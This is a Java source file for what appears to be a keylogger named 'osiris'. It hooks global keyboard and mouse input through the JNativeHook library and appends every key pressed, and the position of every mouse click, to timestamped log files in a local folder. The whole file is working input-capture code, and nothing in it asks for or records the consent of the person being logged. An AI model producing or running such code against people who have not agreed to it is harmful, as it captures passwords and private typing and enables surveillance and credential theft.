package cd.elgsylvain85.osiris;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.mouse.NativeMouseEvent;
import com.github.kwhat.jnativehook.mouse.NativeMouseListener;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardOpenOption;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Main {

    static String LOG_FOLDER = "log/";
    static String KEYBOARD_LOG_FILE_NAME = "keyboard_$date.log";
    static String MOUSE_LOG_FILE_NAME = "mouse_$date.log";
    static String LOG_DATE_PATTERN = "yyyyMMddHHmm";

    public static void main(String[] args) {
        try {

            var sdf = new SimpleDateFormat(LOG_DATE_PATTERN).format(new Date());

            File keyboardFile = new File(LOG_FOLDER + KEYBOARD_LOG_FILE_NAME.replaceAll("\\$date", sdf));
            File mouseFile = new File(LOG_FOLDER + MOUSE_LOG_FILE_NAME.replaceAll("\\$date", sdf));

            /* prepare logs files */

            new File(LOG_FOLDER).mkdirs();
            keyboardFile.createNewFile();
            mouseFile.createNewFile();

            GlobalScreen.registerNativeHook();

            GlobalScreen.addNativeKeyListener(new NativeKeyListener() {
                @Override
                public void nativeKeyPressed(NativeKeyEvent e) {
                    String toString = NativeKeyEvent.getKeyText(e.getKeyCode());

                    try {
                        Files.writeString(keyboardFile.toPath(), toString, StandardOpenOption.APPEND);
                    } catch (IOException ex) {
                        throw new RuntimeException(ex);
                    }
                }

                @Override
                public void nativeKeyReleased(NativeKeyEvent e) {
                }

                @Override
                public void nativeKeyTyped(NativeKeyEvent e) {
                }
            });

            GlobalScreen.addNativeMouseListener(new NativeMouseListener() {
                @Override
                public void nativeMouseClicked(NativeMouseEvent e) {
                    String button = NativeMouseEvent.getModifiersText(e.getButton());
                    String point = e.getPoint().toString();

                    String toString = button + "(" + point + ")";

                    try {
                        Files.writeString(mouseFile.toPath(), toString, StandardOpenOption.APPEND);
                    } catch (IOException ex) {
                        throw new RuntimeException(ex);
                    }
                }

                @Override
                public void nativeMousePressed(NativeMouseEvent e) {
                }

                @Override
                public void nativeMouseReleased(NativeMouseEvent e) {
                }
            });

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
